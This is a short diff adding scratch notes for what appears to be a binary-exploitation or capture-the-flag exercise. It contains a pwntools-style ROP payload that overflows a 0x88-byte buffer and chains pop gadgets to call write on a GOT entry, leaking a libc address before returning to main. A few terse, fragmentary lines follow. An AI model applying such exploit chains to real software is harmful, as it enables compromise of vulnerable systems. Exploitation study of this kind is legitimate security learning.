@@ -1,0 +1,19 @@
+payload = flat(["A" * 0x88 , pop_start , 0 , 1 , write_got , 8 , write_got , 1 , ret_add , "A" * 8 * 7 , main_add])
+
+pop rbx  0
+pop rbp  1
+pop r12  write_got
+pop r13  8
+pop r14  write_got
+pop r15  1
+retn     ret_add
+
+
+write(1,write_got,8)
+
+filo
+read(0)
+
+gets puts(puts_got)
+
+
